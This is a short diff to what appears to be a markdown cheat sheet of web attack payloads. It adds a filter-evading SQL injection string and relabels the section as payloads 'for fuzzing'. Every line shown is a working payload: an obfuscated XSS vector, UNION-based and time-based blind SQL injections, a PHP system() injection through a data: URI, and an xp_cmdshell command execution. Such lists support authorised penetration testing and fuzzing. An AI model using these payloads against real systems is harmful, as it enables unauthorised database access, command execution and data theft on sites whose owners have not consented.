@@ -171,7 +171,7 @@ xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
 <br>
 
 # SQLi Payloads <br>
-- Advanced SQL Injection payloads
+- Advanced SQL Injection payloads for fuzzing
 
 ```txt
 ' /*!50000union*/ select 1,2,3,4,5,6,7,8,'data://text/plain,<?php echo system("uname -a");?>'-- -
@@ -187,6 +187,7 @@ xxxx'; EXEC xp_cmdshell 'ping interact';--
 orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
 1' OR NOT 2470=2470--
 orwa'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'
+-1+/*!12345UnIoN*//**/(/*!12345SEleCt*//**/ 1,2)+ — +
 ```
 
 <br>
